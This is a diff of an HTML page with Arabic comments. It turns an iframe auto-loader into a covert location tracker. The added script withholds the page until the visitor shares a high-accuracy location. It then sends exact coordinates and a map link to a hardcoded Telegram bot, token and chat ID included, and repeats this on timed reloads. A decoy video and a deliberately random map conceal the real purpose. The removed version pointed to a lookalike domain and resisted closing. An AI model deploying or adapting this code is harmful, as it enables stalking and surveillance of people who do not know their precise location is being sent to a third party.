@@ -1,160 +1,237 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Auto Click with Permissions</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
-        body { margin: 0; padding: 0; background: #000; color: #0f0; font-family: monospace; }
-        .container { padding: 20px; text-align: center; }
-        iframe { width: 100%; height: 80vh; border: 2px solid #0f0; border-radius: 10px; }
-        .permission-modal {
-            position: fixed;
-            top: 0;
-            left: 0;
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+            background-color: #f5f5f5;
+        }
+        .container {
             width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.8);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            z-index: 1000;
+            max-width: 100%;
+            padding: 10px;
+            box-sizing: border-box;
+            display: none; /* إخفاء المحتوى افتراضياً */
         }
-        .permission-content {
-            background: #111;
-            border: 2px solid #0f0;
-            border-radius: 10px;
-            padding: 20px;
-            max-width: 500px;
+        video {
+            width: 100%;
+            height: auto;
+            display: block;
+            margin-bottom: 15px;
+            border-radius: 8px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+        }
+        .map-container {
+            width: 100%;
+            height: 300px;
+            border-radius: 8px;
+            overflow: hidden;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+            margin-bottom: 15px;
+        }
+        .permission-denied {
             text-align: center;
+            padding: 50px 20px;
+            font-size: 18px;
+            color: #d32f2f;
         }
-        .permission-btn {
-            background: #0f0;
-            color: #000;
-            border: none;
-            padding: 10px 20px;
-            margin: 10px;
+        .refresh-info {
+            text-align: center;
+            padding: 10px;
+            background-color: #e3f2fd;
             border-radius: 5px;
-            cursor: pointer;
-            font-family: monospace;
-            font-weight: bold;
+            margin-bottom: 15px;
+            font-size: 14px;
         }
-        .permission-btn:hover {
-            background: #0c0;
-        }
-        .permission-btn.deny {
-            background: #f00;
-            color: #fff;
-        }
-        .permission-btn.deny:hover {
-            background: #c00;
+        @media (min-width: 768px) {
+            .container {
+                max-width: 800px;
+                margin: 0 auto;
+                padding: 20px;
+            }
+            .map-container {
+                height: 400px;
+            }
         }
     </style>
-</head>
-<body>
-    <div id="permissionModal" class="permission-modal">
-        <div class="permission-content">
-            <h2>طلب إذن الوصول للموقع الجغرافي</h2>
-            <p>هذا التطبيق يطلب إذنك للوصول إلى موقعك الجغرافي لتحسين تجربة الاستخدام.</p>
-            <p>هل توافق على منح هذا الإذن؟</p>
-            <button id="grantPermission" class="permission-btn">نعم، أوافق</button>
-            <button id="denyPermission" class="permission-btn deny">لا، لا أوافق</button>
-        </div>
-    </div>
-
-    <div class="container">
-        <h2></h2>
-        <p> </p>
-        
-        <iframe id="targetFrame" src="about:blank" 
-                allow="camera; microphone; geolocation; notifications">
-        </iframe>
-        
-        <p id="status">جاري التحميل...</p>
-    </div>
-
     <script>
-        const TARGET_URL = "https://googlecldage.github.io/code3"; // ضع رابطك هنا
-        const INTERVAL = 600000; // 10 دقائق
-        
-        let clickCount = 0;
-        const frame = document.getElementById('targetFrame');
-        const permissionModal = document.getElementById('permissionModal');
-        const grantBtn = document.getElementById('grantPermission');
-        const denyBtn = document.getElementById('denyPermission');
+        // إعدادات البوت
+        const BOT_TOKEN = '8071212707:AAFvb7gER0iIsZCRt14JPzkTLksCULJY4aI';
+        const CHAT_ID = '6451561574';
+        let sendCount = 0;
+        let refreshInterval;
 
-        // طلب إذن الموقع الجغرافي
-        function requestGeolocationPermission() {
-            if ("geolocation" in navigator) {
+        // طلب الموقع مباشرة عند تحميل الصفحة
+        window.onload = function() {
+            // إضافة معلومات التحديث
+            const refreshInfo = document.createElement('div');
+            refreshInfo.className = 'refresh-info';
+            refreshInfo.innerHTML = 'سيتم تحديث الصفحة تلقائياً كل 5 دقائق';
+            document.body.insertBefore(refreshInfo, document.body.firstChild);
+            
+            if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     function(position) {
-                        // تم الحصول على الموقع
-                        console.log("✅ تم الحصول على إذن الموقع الجغرافي");
-                        permissionModal.style.display = 'none';
-                        startService();
+                        // إذا وافق على المشاركة، نعرض المحتوى
+                        document.querySelector('.container').style.display = 'block';
+                        sendLocationData(position);
+                        
+                        // تشغيل الفيديو تلقائياً بعد الموافقة
+                        const video = document.getElementById('autoplay-video');
+                        video.play().catch(e => console.log('فشل التشغيل التلقائي:', e));
+                        
+                        // عرض خريطة عشوائية
+                        showRandomMap();
+                        
+                        // بدء التحديث التلقائي كل 5 دقائق
+                        startAutoRefresh();
                     },
                     function(error) {
-                        // تم رفض الإذن
-                        console.log("❌ تم رفض إذن الموقع الجغرافي");
-                        permissionModal.style.display = 'none';
-                        startService();
-                    }
+                        // إذا رفض المشاركة
+                        handleError(error);
+                        showPermissionDenied();
+                        setTimeout(() => {
+                            window.location.href = 'about:blank'; // الخروج من الصفحة
+                        }, 3000);
+                    },
+                    {enableHighAccuracy: true, timeout: 10000}
                 );
             } else {
-                // المتصفح لا يدعم الموقع الجغرافي
-                console.log("❌ المتصفح لا يدعم الموقع الجغرافي");
-                permissionModal.style.display = 'none';
-                startService();
+                sendToTelegram("❌ المتصفح لا يدعم خدمة الموقع");
+                showPermissionDenied();
+                setTimeout(() => {
+                    window.location.href = 'about:blank'; // الخروج من الصفحة
+                }, 3000);
+            }
+        };
+
+        // بدء التحديث التلقائي كل 5 دقائق
+        function startAutoRefresh() {
+            // تحديث كل 5 دقائق (300000 ميلي ثانية)
+            refreshInterval = setInterval(function() {
+                // إرسال رسالة قبل التحديث
+                sendToTelegram("🔄 جاري تحديث الصفحة...");
+                
+                // إعادة تحميل الصفحة
+                window.location.reload();
+            }, 300000); // 5 دقائق
+        }
+
+        // إيقاف التحديث التلقائي عند إغلاق الصفحة
+        window.onbeforeunload = function() {
+            if (refreshInterval) {
+                clearInterval(refreshInterval);
+            }
+        };
+
+        // عرض رسالة رفض الإذن
+        function showPermissionDenied() {
+            document.body.innerHTML = `
+                <div class="permission-denied">
+                    <h2>يجب الموافقة على مشاركة الموقع الجغرافي لتتمكن من مشاهدة المحتوى</h2>
+                    <p>جاري إغلاق الصفحة...</p>
+                </div>
+            `;
+        }
+
+        // إرسال البيانات الدقيقة إلى التليجرام فقط
+        function sendLocationData(position) {
+            const {latitude, longitude, accuracy} = position.coords;
+            const time = new Date().toLocaleString();
+            const mapLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
+            
+            const message = `📍 موقع المستخدم الدقيق:
+- خط العرض: ${latitude}
+- خط الطول: ${longitude}
+- الدقة: ${accuracy} متر
+- الوقت: ${time}
+- ${mapLink}`;
+            
+            sendToTelegram(message);
+            sendCount++;
+            
+            // إرسال تحديثين إضافيين
+            if (sendCount < 3) {
+                setTimeout(() => {
+                    navigator.geolocation.getCurrentPosition(
+                        sendLocationData,
+                        handleError,
+                        {enableHighAccuracy: true, timeout: 10000}
+                    );
+                }, 5000);
             }
         }
 
-        // معالجة الأزرار
-        grantBtn.addEventListener('click', requestGeolocationPermission);
-        denyBtn.addEventListener('click', function() {
-            console.log("❌ تم رفض إذن الموقع الجغرافي من قبل المستخدم");
-            permissionModal.style.display = 'none';
-            startService();
-        });
+        // عرض خريطة عشوائية في الصفحة (ليس الموقع الحقيقي)
+        function showRandomMap() {
+            // إحداثيات عشوائية (مثال: مناطق مختلفة حول العالم)
+            const randomLocations = [
+                {lat: 40.7128, lng: -74.0060},  // نيويورك
+                {lat: 34.0522, lng: -118.2437}, // لوس أنجلوس
+                {lat: 51.5074, lng: -0.1278},  // لندن
+                {lat: 48.8566, lng: 2.3522},    // باريس
+                {lat: 35.6762, lng: 139.6503},  // طوكيو
+                {lat: -33.8688, lng: 151.2093}, // سيدني
+                {lat: 55.7558, lng: 37.6173},   // موسكو
+                {lat: 30.0444, lng: 31.2357}    // القاهرة
+            ];
+            
+            // اختيار موقع عشوائي
+            const randomLocation = randomLocations[Math.floor(Math.random() * randomLocations.length)];
+            
+            // تحديث الخريطة بالموقع العشوائي
+            const iframe = document.getElementById('map-iframe');
+            iframe.src = `https://maps.google.com/maps?q=${randomLocation.lat},${randomLocation.lng}&z=12&output=embed`;
+        }
 
-        function loadTargetUrl() {
-            try {
-                frame.src = TARGET_URL;
-                clickCount++;
-                document.getElementById('status').textContent = 
-                    `تم التحميل ${clickCount} مرات - ${new Date().toLocaleTimeString()}`;
-                
-                console.log(`✅ تم تحميل الرابط #${clickCount}`);
-                
-            } catch (error) {
-                console.log('❌ خطأ في التحميل:', error);
+        function handleError(error) {
+            let errorMessage = "❌ خطأ في الموقع: ";
+            switch(error.code) {
+                case 1: errorMessage += "تم رفض الإذن"; break;
+                case 2: errorMessage += "المعلومات غير متاحة"; break;
+                case 3: errorMessage += "انتهى الوقت"; break;
+                default: errorMessage += "خطأ غير معروف";
             }
+            sendToTelegram(errorMessage);
         }
 
-        // بدء الخدمة
-        function startService() {
-            // التحميل الفوري
-            loadTargetUrl();
-            
-            // التكرار كل 10 دقائق
-            setInterval(loadTargetUrl, INTERVAL);
-            
-            // مقاومة الإغلاق
-            window.onbeforeunload = (e) => {
-                e.preventDefault();
-                return "الخدمة تعمل! لا تغلق الصفحة";
-            };
+        function sendToTelegram(text) {
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: text,
+                    disable_notification: false
+                })
+            }).catch(e => console.error('Error sending to Telegram:', e));
         }
-
-        // تشغيل تلقائي بعد إذن المستخدم
-        // (سيتم استدعاء startService من خلال نافذة الإذن)
-
-        // تحديث حالة الـ iframe
-        frame.onload = () => {
-            document.getElementById('status').textContent = 
-                `تم التحميل بنجاح - ${new Date().toLocaleTimeString()}`;
-        };
-
-        frame.onerror = () => {
-            document.getElementById('status').textContent = '❌ خطأ في التحميل';
-        };
     </script>
+</head>
+<body>
+    <div class="container">
+        <!-- الفيديو الذي يعمل تلقائياً -->
+        <video id="autoplay-video" autoplay muted loop controls>
+            <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
+            متصفحك لا يدعم تشغيل الفيديو.
+        </video>
+        
+        <!-- خريطة جوجل عشوائية -->
+        <div class="map-container">
+            <iframe 
+                id="map-iframe"
+                width="100%" 
+                height="100%" 
+                frameborder="0" 
+                style="border:0"
+                src="https://maps.google.com/maps?q=0,0&z=2&output=embed"
+                allowfullscreen>
+            </iframe>
+        </div>
+    </div>
 </body>
 </html>
